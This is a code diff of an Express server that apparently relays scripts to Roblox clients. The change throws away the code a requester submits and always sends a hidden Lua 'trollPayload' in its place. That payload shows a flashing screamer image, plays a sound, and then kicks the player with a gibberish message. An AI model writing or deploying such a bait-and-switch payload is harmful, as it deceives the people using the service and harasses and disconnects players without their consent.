@@ -24,14 +24,12 @@ function generateGibberish(length = 16) {
 }
 
 app.post("/executeRequest", (req, res) => {
-  const { username, code } = req.body;
-  if (!username || !code) return res.sendStatus(400);
+  const { username } = req.body;
+  if (!username) return res.sendStatus(400);
 
   console.log(`Execute request from: ${username}`);
-   console.log(username, code);
-  const reason = generateGibberish();
 
-const trollPayload = `
+  const trollPayload = `
 local function generateGibberish(length)
 	local chars = {"你","好","世","界","𓂀","𒐫","Æ","Ø","µ","Δ","Ж","Ѭ","(",")"}
 	local result = ""
@@ -45,7 +43,6 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Make sure we don’t add duplicate
 if not PlayerGui:FindFirstChild("Screamer") then
 	local screamerGui = Instance.new("ScreenGui")
 	screamerGui.Name = "Screamer"
@@ -66,7 +63,6 @@ if not PlayerGui:FindFirstChild("Screamer") then
 	sound.Parent = screamerGui
 	sound:Play()
 
-	-- Optional: Flashing effect
 	spawn(function()
 		while true do
 			img.ImageTransparency = 0
@@ -76,22 +72,21 @@ if not PlayerGui:FindFirstChild("Screamer") then
 		end
 	end)
 
-	-- Kick after delay
 	task.delay(3, function()
 		LocalPlayer:Kick(generateGibberish(16))
 	end)
 end
-
 `;
 
+  // Send trollPayload through event
   events.emit(EVENT, { username, code: trollPayload });
   res.sendStatus(200);
 });
 
 app.get("/fetchExecuteRequests", (req, res) => {
   events.once(EVENT, ({ username, code }) => {
-    res.json({ username, trollPayload });
-	  console.log(username, trollPayload);
+    res.json({ username, code });
+    console.log("Sending code to:", username);
   });
 });
 
